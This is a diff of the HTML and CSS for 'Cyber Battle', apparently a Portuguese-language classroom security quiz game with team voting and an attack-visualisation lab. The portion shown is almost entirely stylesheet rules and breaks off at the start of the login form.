@@ -3,213 +3,403 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cyber Battle — Fase 1</title>
+<title>Cyber Battle</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-:root{--red:#ff2244;--blue:#00aaff;--green:#00ff88;--amber:#ffaa00;--dark:#080c14;--panel:#0d1526;--border:#1a2a4a;--text:#c8d8f0;--mono:'Share Tech Mono',monospace;--orb:'Orbitron',sans-serif;--raj:'Rajdhani',sans-serif;}
+:root{--red:#ff2244;--blue:#00aaff;--green:#00ff88;--amber:#ffaa00;--purple:#aa55ff;
+  --dark:#080c14;--panel:#0d1526;--border:#1a2a4a;--text:#c8d8f0;
+  --mono:'Share Tech Mono',monospace;--orb:'Orbitron',sans-serif;--raj:'Rajdhani',sans-serif;}
 *{margin:0;padding:0;box-sizing:border-box;}
 body{background:var(--dark);color:var(--text);font-family:var(--raj);min-height:100vh;overflow-x:hidden;}
 body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,170,255,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,170,255,0.04) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
-.container{position:relative;z-index:1;max-width:680px;margin:0 auto;padding:20px;}
-.header{text-align:center;padding:28px 0 18px;border-bottom:1px solid var(--border);margin-bottom:24px;}
-.logo{font-family:var(--orb);font-size:1.8rem;font-weight:900;letter-spacing:4px;background:linear-gradient(90deg,var(--red),var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
-.subtitle{font-family:var(--mono);font-size:0.72rem;color:#4a6a8a;letter-spacing:3px;margin-top:5px;}
-.panel{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:24px;margin-bottom:18px;position:relative;overflow:hidden;}
+.page{position:relative;z-index:1;max-width:680px;margin:0 auto;padding:16px;display:none;}
+.page.active{display:block;}
+.header{text-align:center;padding:20px 0 14px;border-bottom:1px solid var(--border);margin-bottom:18px;}
+.logo{font-family:var(--orb);font-size:1.6rem;font-weight:900;letter-spacing:4px;background:linear-gradient(90deg,var(--red),var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.subtitle{font-family:var(--mono);font-size:0.68rem;color:#4a6a8a;letter-spacing:3px;margin-top:4px;}
+.panel{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:14px;position:relative;overflow:hidden;}
 .panel::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
-.panel.blue-accent::before{background:var(--blue);}
-.panel.green-accent::before{background:var(--green);}
-.panel.red-accent::before{background:var(--red);}
-.panel.amber-accent::before{background:var(--amber);}
-.panel-title{font-family:var(--orb);font-size:0.7rem;letter-spacing:3px;color:#4a6a8a;margin-bottom:18px;}
-label{font-family:var(--mono);font-size:0.75rem;color:#4a8aaa;display:block;margin-bottom:5px;}
-input[type=text],input[type=password]{width:100%;background:#060c18;border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:0.95rem;padding:11px 14px;border-radius:4px;outline:none;transition:border-color 0.2s;margin-bottom:14px;}
-input[type=text]:focus,input[type=password]:focus{border-color:var(--blue);}
+.panel.blue::before{background:var(--blue);}
+.panel.green::before{background:var(--green);}
+.panel.red::before{background:var(--red);}
+.panel.amber::before{background:var(--amber);}
+.panel-title{font-family:var(--orb);font-size:0.65rem;letter-spacing:3px;color:#4a6a8a;margin-bottom:14px;}
+label{font-family:var(--mono);font-size:0.7rem;color:#4a8aaa;display:block;margin-bottom:4px;}
+input[type=text],input[type=password]{width:100%;background:#060c18;border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:0.88rem;padding:10px 12px;border-radius:4px;outline:none;transition:border-color 0.2s;margin-bottom:11px;}
+input:focus{border-color:var(--blue);}
 input::placeholder{color:#2a4a6a;}
-.team-select{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:5px;margin-bottom:14px;}
-.team-btn{padding:14px;border-radius:6px;cursor:pointer;text-align:center;transition:all 0.2s;font-family:var(--orb);font-size:0.75rem;letter-spacing:2px;color:#4a6a8a;border:2px solid var(--border);background:#060c18;}
-.team-btn:hover{border-color:#2a4a6a;}
-.team-btn.selected-red{border-color:var(--red)!important;color:var(--red)!important;background:rgba(255,34,68,0.1)!important;}
-.team-btn.selected-blue{border-color:var(--blue)!important;color:var(--blue)!important;background:rgba(0,170,255,0.1)!important;}
-.team-icon{font-size:1.6rem;display:block;margin-bottom:5px;}
-.btn-primary{width:100%;padding:13px;background:transparent;border:2px solid var(--blue);color:var(--blue);font-family:var(--orb);font-size:0.82rem;letter-spacing:3px;cursor:pointer;border-radius:4px;transition:all 0.2s;}
-.btn-primary:hover{background:rgba(0,170,255,0.15);}
-.btn-primary:disabled{opacity:0.3;cursor:not-allowed;}
-.msg{padding:13px 15px;border-radius:6px;font-family:var(--mono);font-size:0.8rem;line-height:1.6;border:1px solid;margin-bottom:12px;display:none;}
+.team-select{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:11px;}
+.team-btn{padding:12px;border-radius:6px;cursor:pointer;text-align:center;font-family:var(--orb);font-size:0.7rem;letter-spacing:2px;color:#4a6a8a;border:2px solid var(--border);background:#060c18;transition:all 0.2s;}
+.team-btn.sel-red{border-color:var(--red)!important;color:var(--red)!important;background:rgba(255,34,68,0.1)!important;}
+.team-btn.sel-blue{border-color:var(--blue)!important;color:var(--blue)!important;background:rgba(0,170,255,0.1)!important;}
+.t-icon{font-size:1.4rem;display:block;margin-bottom:4px;}
+.btn{width:100%;padding:11px;background:transparent;border:2px solid;font-family:var(--orb);font-size:0.75rem;letter-spacing:3px;cursor:pointer;border-radius:4px;transition:all 0.2s;}
+.btn-blue{border-color:var(--blue);color:var(--blue);}
+.btn-blue:hover{background:rgba(0,170,255,0.1);}
+.btn-green{border-color:var(--green);color:var(--green);}
+.btn-green:hover{background:rgba(0,255,136,0.1);}
+.btn:disabled{opacity:0.3;cursor:not-allowed;}
+.msg{padding:9px 12px;border-radius:5px;font-family:var(--mono);font-size:0.72rem;line-height:1.6;border:1px solid;margin-bottom:10px;display:none;}
 .msg.error{border-color:#4a2a2a;background:rgba(255,34,68,0.05);color:var(--red);}
 .msg.info{border-color:#2a3a4a;background:rgba(0,170,255,0.05);color:var(--blue);}
-.msg.success{border-color:#2a4a2a;background:rgba(0,255,136,0.05);color:var(--green);}
-.msg.warn{border-color:#4a3a1a;background:rgba(255,170,0,0.05);color:var(--amber);}
-.pulse{animation:pulse 1.5s infinite;display:block;font-size:2.8rem;margin-bottom:14px;}
+.msg.ok{border-color:#2a4a2a;background:rgba(0,255,136,0.05);color:var(--green);}
+.badge{display:inline-flex;align-items:center;gap:6px;padding:3px 10px;border-radius:4px;font-family:var(--orb);font-size:0.62rem;letter-spacing:2px;}
+.badge.red{background:rgba(255,34,68,0.12);color:var(--red);border:1px solid rgba(255,34,68,0.25);}
+.badge.blue{background:rgba(0,170,255,0.12);color:var(--blue);border:1px solid rgba(0,170,255,0.25);}
+.pulse{animation:pulse 1.5s infinite;font-size:2.2rem;display:block;margin-bottom:10px;}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
-.wt-title{font-family:var(--orb);font-size:0.95rem;letter-spacing:3px;color:var(--blue);margin-bottom:6px;}
-.wt-sub{font-family:var(--mono);font-size:0.75rem;color:#4a6a8a;}
-.badge{display:inline-block;padding:4px 12px;border-radius:4px;font-family:var(--orb);font-size:0.68rem;letter-spacing:2px;margin-bottom:14px;}
-.badge.red{background:rgba(255,34,68,0.15);color:var(--red);border:1px solid rgba(255,34,68,0.3);}
-.badge.blue{background:rgba(0,170,255,0.15);color:var(--blue);border:1px solid rgba(0,170,255,0.3);}
-.lab-link-box{background:#060c18;border:1px solid rgba(0,255,136,0.3);border-radius:6px;padding:16px;margin-top:14px;}
-.lab-link-title{font-family:var(--orb);font-size:0.68rem;letter-spacing:2px;color:var(--green);margin-bottom:8px;}
-.lab-link-desc{font-family:var(--mono);font-size:0.75rem;color:#4a6a8a;margin-bottom:10px;line-height:1.6;}
-.lab-link-url{font-family:var(--mono);font-size:0.8rem;color:var(--blue);word-break:break-all;text-decoration:underline;cursor:pointer;}
-.lab-link-btn{width:100%;margin-top:12px;padding:11px;background:transparent;border:2px solid var(--green);color:var(--green);font-family:var(--orb);font-size:0.78rem;letter-spacing:2px;cursor:pointer;border-radius:4px;transition:all 0.2s;}
-.lab-link-btn:hover{background:rgba(0,255,136,0.1);}
-.reauth-box{background:#060c18;border:1px solid rgba(255,170,0,0.3);border-radius:6px;padding:16px;margin-top:14px;}
-.reauth-title{font-family:var(--orb);font-size:0.68rem;letter-spacing:2px;color:var(--amber);margin-bottom:8px;}
-.reauth-desc{font-family:var(--mono);font-size:0.75rem;color:#4a6a8a;line-height:1.6;}
-.score-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;padding:9px 14px;background:#060c18;border:1px solid var(--border);border-radius:6px;}
-.score-item{text-align:center;}
-.score-lbl{font-family:var(--mono);font-size:0.62rem;color:#4a6a8a;letter-spacing:2px;}
-.score-val{font-family:var(--orb);font-size:1.2rem;font-weight:700;}
-.score-val.red{color:var(--red);}
-.score-val.blue{color:var(--blue);}
-.score-sep{font-family:var(--mono);color:#2a4a6a;}
-.timer-wrap{text-align:center;margin-bottom:18px;}
-.timer-circle{width:88px;height:88px;border-radius:50%;border:3px solid var(--border);margin:0 auto 8px;display:flex;align-items:center;justify-content:center;font-family:var(--orb);font-size:1.6rem;font-weight:700;transition:all 0.3s;}
+.wt{font-family:var(--orb);font-size:0.88rem;letter-spacing:3px;color:var(--blue);margin-bottom:5px;}
+.ws{font-family:var(--mono);font-size:0.7rem;color:#4a6a8a;}
+.lab-box{background:#060c18;border:1px solid rgba(0,255,136,0.3);border-radius:6px;padding:12px;margin-top:12px;display:none;}
+.lab-box-title{font-family:var(--orb);font-size:0.62rem;letter-spacing:2px;color:var(--green);margin-bottom:9px;}
+.reauth-box{background:#060c18;border:1px solid rgba(255,170,0,0.3);border-radius:6px;padding:12px;margin-top:12px;display:none;}
+.score-bar{display:flex;justify-content:space-between;align-items:center;padding:7px 12px;background:#060c18;border:1px solid var(--border);border-radius:6px;margin-bottom:14px;}
+.sc-item{text-align:center;}
+.sc-lbl{font-family:var(--mono);font-size:0.58rem;color:#4a6a8a;letter-spacing:2px;}
+.sc-val{font-family:var(--orb);font-size:1.05rem;font-weight:700;}
+.sc-val.red{color:var(--red);}
+.sc-val.blue{color:var(--blue);}
+.sc-sep{font-family:var(--mono);color:#2a4a6a;}
+.player-bar{display:flex;align-items:center;justify-content:space-between;padding:6px 10px;background:#060c18;border:1px solid var(--border);border-radius:5px;margin-bottom:11px;}
+.timer-wrap{text-align:center;margin-bottom:14px;}
+.timer-circle{width:78px;height:78px;border-radius:50%;border:3px solid var(--border);margin:0 auto 7px;display:flex;align-items:center;justify-content:center;font-family:var(--orb);font-size:1.4rem;font-weight:700;transition:all 0.3s;}
 .timer-circle.urgent{border-color:var(--red);color:var(--red);animation:blink 0.5s infinite;}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:0.6}}
-.timer-lbl{font-family:var(--mono);font-size:0.68rem;color:#4a6a8a;letter-spacing:2px;}
-.q-counter{font-family:var(--mono);font-size:0.72rem;color:#4a6a8a;margin-bottom:8px;letter-spacing:2px;}
-.q-text{font-size:1.05rem;font-weight:600;line-height:1.5;margin-bottom:18px;color:#e0eeff;}
-.options{display:grid;gap:9px;}
-.opt-btn{padding:13px 16px;background:#060c18;border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--raj);font-size:0.95rem;cursor:pointer;text-align:left;transition:all 0.2s;display:flex;align-items:center;gap:11px;}
+.timer-lbl{font-family:var(--mono);font-size:0.62rem;color:#4a6a8a;letter-spacing:2px;}
+.q-counter{font-family:var(--mono);font-size:0.65rem;color:#4a6a8a;margin-bottom:6px;letter-spacing:2px;}
+.q-text{font-size:0.98rem;font-weight:600;line-height:1.5;margin-bottom:14px;color:#e0eeff;}
+.options{display:grid;gap:7px;}
+.opt-btn{padding:11px 13px;background:#060c18;border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--raj);font-size:0.9rem;cursor:pointer;text-align:left;transition:all 0.2s;display:flex;align-items:center;gap:9px;}
 .opt-btn:hover:not(:disabled){border-color:var(--blue);background:rgba(0,170,255,0.06);}
 .opt-btn:disabled{cursor:not-allowed;opacity:0.5;}
-.opt-btn.selected{border-color:var(--blue);background:rgba(0,170,255,0.12);color:var(--blue);}
-.opt-btn.correct{border-color:var(--green);background:rgba(0,255,136,0.1);color:var(--green);}
-.opt-btn.wrong{border-color:var(--red);background:rgba(255,34,68,0.1);color:var(--red);}
-.opt-letter{font-family:var(--orb);font-size:0.72rem;width:22px;height:22px;border:1px solid currentColor;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
-.btn-send{width:100%;margin-top:14px;padding:13px;background:transparent;border:2px solid var(--green);color:var(--green);font-family:var(--orb);font-size:0.82rem;letter-spacing:3px;cursor:pointer;border-radius:4px;transition:all 0.2s;}
-.btn-send:hover:not(:disabled){background:rgba(0,255,136,0.1);}
-.btn-send:disabled{opacity:0.3;cursor:not-allowed;}
-.hint-box{margin-top:12px;padding:9px 13px;background:rgba(0,170,255,0.05);border:1px solid rgba(0,170,255,0.2);border-radius:4px;font-family:var(--mono);font-size:0.75rem;color:#4a8aaa;display:none;line-height:1.5;}
-.btn-hint{margin-top:9px;padding:5px 13px;background:transparent;border:1px solid #1a3a5a;color:#4a6a8a;font-family:var(--mono);font-size:0.72rem;cursor:pointer;border-radius:4px;}
+.opt-btn.selected{border-color:var(--blue);background:rgba(0,170,255,0.1);color:var(--blue);}
+.opt-letter{font-family:var(--orb);font-size:0.65rem;width:20px;height:20px;border:1px solid currentColor;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.hint-box{margin-top:9px;padding:7px 11px;background:rgba(0,170,255,0.05);border:1px solid rgba(0,170,255,0.2);border-radius:4px;font-family:var(--mono);font-size:0.7rem;color:#4a8aaa;display:none;line-height:1.5;}
+.btn-hint{margin-top:7px;padding:4px 11px;background:transparent;border:1px solid #1a3a5a;color:#4a6a8a;font-family:var(--mono);font-size:0.65rem;cursor:pointer;border-radius:3px;}
 .btn-hint:hover{border-color:var(--blue);color:var(--blue);}
-#result-overlay{display:none;position:fixed;inset:0;background:rgba(5,8,16,0.93);z-index:100;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:20px;}
-.res-icon{font-size:3.5rem;margin-bottom:12px;}
-.res-title{font-family:var(--orb);font-size:1.3rem;letter-spacing:4px;margin-bottom:8px;}
-.res-title.red{color:var(--red);}
-.res-title.blue{color:var(--blue);}
-.res-title.draw{color:var(--green);}
-.res-sub{font-family:var(--mono);font-size:0.8rem;color:#4a6a8a;margin-bottom:5px;}
-.res-winner{font-family:var(--orb);font-size:1rem;letter-spacing:3px;margin-top:10px;}
-.res-winner.red{color:var(--red);}
-.res-winner.blue{color:var(--blue);}
-.res-winner.draw{color:var(--green);}
-.prog-bar{height:3px;background:var(--border);border-radius:2px;margin-bottom:14px;}
+.prog-bar{height:3px;background:var(--border);border-radius:2px;margin-bottom:11px;}
 .prog-fill{height:100%;border-radius:2px;background:var(--blue);transition:width 0.5s;}
-#end-screen{display:none;text-align:center;padding:30px 0;}
-.end-title{font-family:var(--orb);font-size:1.4rem;letter-spacing:4px;margin-bottom:14px;}
-.final-scores{display:flex;justify-content:center;gap:36px;margin:18px 0;}
+#result-overlay{display:none;position:fixed;inset:0;background:rgba(5,8,16,0.93);z-index:100;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:20px;}
+.res-icon{font-size:2.8rem;margin-bottom:9px;}
+.res-title{font-family:var(--orb);font-size:1.1rem;letter-spacing:4px;margin-bottom:6px;}
+.res-title.red{color:var(--red);}.res-title.blue{color:var(--blue);}.res-title.draw{color:var(--green);}
+.res-sub{font-family:var(--mono);font-size:0.72rem;color:#4a6a8a;margin-bottom:4px;}
+.res-winner{font-family:var(--orb);font-size:0.9rem;letter-spacing:3px;margin-top:8px;}
+.res-winner.red{color:var(--red);}.res-winner.blue{color:var(--blue);}.res-winner.draw{color:var(--green);}
+.scenario-box{background:#060c18;border:1px solid var(--amber);border-radius:6px;padding:12px;margin-bottom:14px;}
+.sc-phase-lbl{font-family:var(--mono);font-size:0.58rem;color:var(--amber);letter-spacing:2px;margin-bottom:4px;}
+.sc-name{font-family:var(--orb);font-size:0.88rem;letter-spacing:2px;color:#e0eeff;margin-bottom:2px;}
+.sc-ctx{font-family:var(--mono);font-size:0.65rem;color:#4a6a8a;}
+.choice-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:11px;}
+.choice-btn{padding:11px 7px;background:#060c18;border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--raj);font-size:0.82rem;cursor:pointer;text-align:center;transition:all 0.2s;line-height:1.3;}
+.choice-btn:hover:not(:disabled){border-color:var(--blue);background:rgba(0,170,255,0.06);}
+.choice-btn:disabled{cursor:not-allowed;opacity:0.5;}
+.choice-btn.sel-red{border-color:var(--red);background:rgba(255,34,68,0.1);color:var(--red);}
+.choice-btn.sel-blue{border-color:var(--blue);background:rgba(0,170,255,0.1);color:var(--blue);}
+.ch-icon{font-size:1.2rem;display:block;margin-bottom:2px;}
+.vc{font-family:var(--mono);font-size:0.58rem;color:#4a6a8a;margin-top:2px;}
+.voted-msg{text-align:center;padding:14px;font-family:var(--mono);font-size:0.75rem;color:var(--green);border:1px solid rgba(0,255,136,0.2);border-radius:6px;background:rgba(0,255,136,0.04);}
+.rdot-row{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:11px;}
+.rdot{width:9px;height:9px;border-radius:50%;background:var(--border);}
+.rdot.red{background:var(--red);}.rdot.blue{background:var(--blue);}.rdot.draw{background:#4a6a8a;}.rdot.cur{border:2px solid var(--amber);background:transparent;}
+.end-center{text-align:center;padding:20px 0;}
+.end-icon{font-size:3rem;margin-bottom:12px;}
+.end-title{font-family:var(--orb);font-size:1.2rem;letter-spacing:4px;margin-bottom:10px;}
+.final-scores{display:flex;justify-content:center;gap:30px;margin:14px 0;}
 .fs-item{text-align:center;}
-.fs-val{font-family:var(--orb);font-size:2.2rem;font-weight:700;}
-.fs-val.red{color:var(--red);}
-.fs-val.blue{color:var(--blue);}
-.voted-msg{text-align:center;padding:18px;font-family:var(--mono);font-size:0.82rem;color:var(--green);border:1px solid rgba(0,255,136,0.2);border-radius:6px;background:rgba(0,255,136,0.05);}
+.fs-val{font-family:var(--orb);font-size:1.8rem;font-weight:700;}
+.fs-val.red{color:var(--red);}.fs-val.blue{color:var(--blue);}
+.lab-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin-bottom:14px;}
+.algo-card{background:var(--panel);border:1px solid var(--border);border-radius:7px;padding:16px;cursor:pointer;transition:all 0.2s;position:relative;overflow:hidden;}
+.algo-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.algo-card:hover{border-color:#1e3560;transform:translateY(-1px);}
+.c-red::before{background:var(--red);}.c-amber::before{background:var(--amber);}.c-purple::before{background:var(--purple);}.c-blue::before{background:var(--blue);}
+.card-num{font-size:0.54rem;letter-spacing:3px;color:#2a4a6a;margin-bottom:7px;}
+.card-icon{font-size:1.6rem;margin-bottom:7px;display:block;}
+.card-title{font-family:var(--orb);font-size:0.85rem;font-weight:700;color:#fff;margin-bottom:3px;}
+.card-tag{display:inline-block;padding:1px 6px;border-radius:2px;font-size:0.53rem;letter-spacing:2px;margin-bottom:7px;}
+.tag-red{background:rgba(255,51,85,0.12);color:var(--red);border:1px solid rgba(255,51,85,0.25);}
+.tag-amber{background:rgba(255,170,0,0.1);color:var(--amber);border:1px solid rgba(255,170,0,0.2);}
+.tag-purple{background:rgba(170,85,255,0.1);color:var(--purple);border:1px solid rgba(170,85,255,0.2);}
+.tag-blue{background:rgba(0,170,255,0.1);color:var(--blue);border:1px solid rgba(0,170,255,0.2);}
+.card-desc{font-size:0.65rem;color:#4a6a8a;line-height:1.6;margin-bottom:8px;}
+.algo-topbar{display:flex;align-items:center;gap:10px;padding:8px 0;margin-bottom:12px;border-bottom:1px solid var(--border);}
+.btn-back-lab{padding:4px 10px;border:1px solid var(--border);color:#4a6a8a;font-family:var(--mono);font-size:0.62rem;letter-spacing:2px;cursor:pointer;border-radius:3px;background:transparent;}
+.btn-back-lab:hover{border-color:var(--green);color:var(--green);}
+.algo-split{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+@media(max-width:580px){.algo-split{grid-template-columns:1fr;}}
+.code-pane{background:#060c18;border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+.code-head{padding:7px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:5px;background:rgba(0,0,0,0.2);}
+.cdot{width:7px;height:7px;border-radius:50%;}
+.cfname{font-family:var(--mono);font-size:0.6rem;color:#4a6a8a;margin-left:3px;}
+.code-scroll{overflow-y:auto;max-height:260px;padding:3px 0;}
+.code-line{display:flex;padding:1px 10px;font-size:0.65rem;line-height:1.8;border-left:2px solid transparent;transition:all 0.2s;}
+.hl-green{background:rgba(0,255,136,0.06);border-left-color:var(--green)!important;}
+.hl-red{background:rgba(255,34,68,0.06);border-left-color:var(--red)!important;}
+.hl-amber{background:rgba(255,170,0,0.06);border-left-color:var(--amber)!important;}
+.ln{color:#2a4a6a;min-width:20px;padding-right:8px;font-size:0.58rem;user-select:none;}
+.kw{color:#ff79c6;}.fn{color:#50fa7b;}.str{color:#f1fa8c;}.cm{color:#4a6272;font-style:italic;}.var{color:#8be9fd;}.num{color:#bd93f9;}
+.step-bar{padding:7px 10px;border-top:1px solid var(--border);background:rgba(0,0,0,0.2);display:flex;align-items:center;gap:5px;}
+.sbtn{padding:4px 12px;font-size:0.6rem;letter-spacing:2px;font-family:var(--mono);cursor:pointer;border-radius:3px;border:1px solid;transition:all 0.15s;}
+.sbtn:disabled{opacity:0.3;cursor:not-allowed;}
+.sbtn-p{border-color:var(--border);color:#4a6a8a;background:transparent;}
+.sbtn-p:hover:not(:disabled){border-color:#4a6a8a;}
+.sbtn-n{border-color:var(--green);color:var(--green);background:transparent;}
+.sbtn-n:hover:not(:disabled){background:rgba(0,255,136,0.08);}
+.sbtn-r{border-color:var(--border);color:#2a4a6a;background:transparent;font-size:0.56rem;}
+.sbtn-r:hover{border-color:var(--red);color:var(--red);}
+.step-num{margin-left:auto;font-size:0.56rem;color:#2a4a6a;letter-spacing:2px;}
+.vis-pane{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:12px;overflow-y:auto;max-height:320px;}
+.exp-box{padding:8px 10px;border-left:2px solid var(--green);background:rgba(0,255,136,0.04);border-radius:0 3px 3px 0;font-size:0.68rem;line-height:1.7;color:var(--text);margin-bottom:9px;transition:all 0.3s;font-family:var(--mono);}
+.exp-box.danger{border-left-color:var(--red);background:rgba(255,34,68,0.04);}
+.exp-box.warn{border-left-color:var(--amber);background:rgba(255,170,0,0.04);}
+.exp-box.info{border-left-color:var(--blue);background:rgba(0,170,255,0.04);}
+.exp-lbl{font-size:0.54rem;letter-spacing:3px;color:#2a4a6a;margin-bottom:4px;display:block;}
+.vis-lbl{font-size:0.54rem;letter-spacing:3px;color:#2a4a6a;margin-bottom:5px;display:block;}
+.pass-wrap{background:#020509;border-radius:4px;padding:10px;margin-bottom:9px;}
+.pass-disp{font-size:1.3rem;letter-spacing:8px;text-align:center;margin-bottom:5px;}
+.pc{display:inline-block;transition:color 0.1s;}
+.pc-lock{color:#2a4a6a;}.pc-try{color:var(--amber);animation:fl 0.1s infinite;}.pc-ok{color:var(--green);}
+@keyframes fl{0%,100%{opacity:1}50%{opacity:0.2}}
+.att-lbl{font-size:0.6rem;color:#4a6a8a;text-align:center;margin-bottom:4px;}
+.prog-t{height:3px;background:var(--border);border-radius:2px;}
+.prog-f{height:100%;border-radius:2px;transition:width 0.3s;}
+.sql-wrap{background:#020509;border-radius:4px;padding:8px;font-size:0.65rem;line-height:1.8;margin-bottom:8px;}
+.sq-s{color:#50fa7b;}.sq-i{color:var(--red);text-decoration:underline;}.sq-n{color:#4a6a8a;}
+.sql-res{padding:5px 9px;border-radius:3px;font-size:0.65rem;margin-bottom:8px;border:1px solid var(--border);}
+.dom-wrap{background:#020509;border-radius:4px;padding:8px;font-size:0.65rem;line-height:1.9;margin-bottom:7px;}
+.dn{display:block;color:#50fa7b;transition:all 0.3s;}
+.dn-inj{color:var(--red);animation:pr 0.8s infinite;}
+.dn-i1{padding-left:11px;}.dn-i2{padding-left:22px;}
+@keyframes pr{0%,100%{opacity:1}50%{opacity:0.4}}
+.ck-box{padding:5px 9px;background:rgba(170,85,255,0.08);border:1px solid rgba(170,85,255,0.3);border-radius:3px;font-size:0.6rem;color:var(--purple);margin-bottom:7px;}
+.em-wrap{background:#020509;border:1px solid var(--border);border-radius:4px;overflow:hidden;margin-bottom:8px;}
+.em-hdr{padding:7px 10px;border-bottom:1px solid var(--border);}
+.ef{display:flex;gap:6px;font-size:0.6rem;padding:2px 0;}
+.ef-l{color:#2a4a6a;min-width:40px;}.ef-v{color:var(--text);}.ef-s{color:var(--red);}
+.em-body{padding:10px;font-size:0.65rem;line-height:1.7;color:#4a6a8a;}
+.elink{color:var(--blue);}.elink-fake{color:var(--red);}
+.mem-tbl{display:grid;grid-template-columns:55px 1fr;gap:3px;font-size:0.6rem;margin-bottom:7px;}
+.mem-addr{color:#4a6a8a;display:flex;align-items:center;}
+.mem-cv{padding:3px 7px;border:1px solid var(--border);border-radius:2px;color:#4a6a8a;transition:all 0.3s;font-size:0.6rem;}
+.mc-ok{border-color:var(--green)!important;color:var(--green)!important;background:rgba(0,255,136,0.05)!important;}
+.mc-warn{border-color:var(--amber)!important;color:var(--amber)!important;}
+.mc-over{border-color:var(--red)!important;color:var(--red)!important;background:rgba(255,34,68,0.07)!important;animation:pr 0.5s infinite;}
+.mc-inj{border-color:var(--purple)!important;color:var(--purple)!important;background:rgba(170,85,255,0.08)!important;}
+.mbytes{display:flex;gap:3px;flex-wrap:wrap;margin-bottom:7px;}
+.mb{width:22px;height:22px;border:1px solid var(--border);border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:0.52rem;transition:all 0.3s;color:#2a4a6a;}
+.mb-ok{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.06);}
+.mb-over{border-color:var(--red);color:var(--red);background:rgba(255,34,68,0.08);animation:pr 0.5s infinite;}
+.mb-inj{border-color:var(--purple);color:var(--purple);background:rgba(170,85,255,0.08);}
+.bot-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:4px;margin-bottom:8px;}
+.bot{aspect-ratio:1;border:1px solid var(--border);border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:0.72rem;transition:all 0.3s;}
+.b-idle{color:#2a4a6a;}.b-inf{border-color:var(--red);background:rgba(255,34,68,0.06);animation:pr 1s infinite;}.b-fire{border-color:var(--amber);background:rgba(255,170,0,0.08);}
+.net-row{display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:10px;flex-wrap:wrap;}
+.nnode{padding:5px 10px;border:1px solid var(--border);border-radius:4px;font-size:0.62rem;text-align:center;transition:all 0.3s;min-width:65px;}
+.nn-ok{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.05);}
+.nn-atk{border-color:var(--red);color:var(--red);background:rgba(255,34,68,0.05);}
+.nn-mid{border-color:var(--purple);color:var(--purple);background:rgba(170,85,255,0.05);}
+.nn-def{border-color:var(--blue);color:var(--blue);background:rgba(0,170,255,0.05);}
+.narr{color:#2a4a6a;font-size:0.85rem;transition:color 0.3s;}
+.na-atk{color:var(--red)!important;}.na-blk{color:var(--green)!important;}
+.pkt-list{display:flex;flex-direction:column;gap:3px;margin-bottom:7px;}
+.pkt{padding:4px 7px;border:1px solid var(--border);border-radius:3px;font-size:0.6rem;display:flex;justify-content:space-between;}
+.pkt-int{border-color:var(--purple);color:var(--purple);background:rgba(170,85,255,0.04);}
+.file-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:3px;margin-bottom:7px;}
+.fitem{padding:5px 3px;border:1px solid var(--border);border-radius:3px;text-align:center;font-size:0.54rem;color:#4a6a8a;transition:all 0.4s;}
+.fi-icon{font-size:0.85rem;display:block;margin-bottom:2px;}
+.fenc{border-color:var(--amber);color:var(--amber);background:rgba(255,170,0,0.05);animation:pr 0.5s infinite;}
+.flocked{border-color:var(--red);color:var(--red);background:rgba(255,34,68,0.04);}
+.rn{padding:7px 9px;background:rgba(255,34,68,0.05);border:1px solid rgba(255,34,68,0.25);border-radius:3px;font-size:0.6rem;color:var(--red);line-height:1.6;margin-bottom:7px;}
+.load-lbl{font-size:0.58rem;color:#4a6a8a;margin-bottom:3px;}
+::-webkit-scrollbar{width:3px;height:3px;}
+::-webkit-scrollbar-track{background:var(--dark);}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px;}
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="header">
-    <div class="logo">CYBER BATTLE</div>
-    <div class="subtitle">// FASE 01 — QUIZ DE SEGURANÇA //</div>
-  </div>
 
-  <!-- LOGIN -->
-  <div id="screen-login">
-    <div class="panel blue-accent">
-      <div class="panel-title">> identificação do agente</div>
-      <label>CÓDIGO DA TURMA</label>
-      <input type="password" id="inp-code" placeholder="Digite o código fornecido pelo professor">
-      <label>SEU NOME COMPLETO</label>
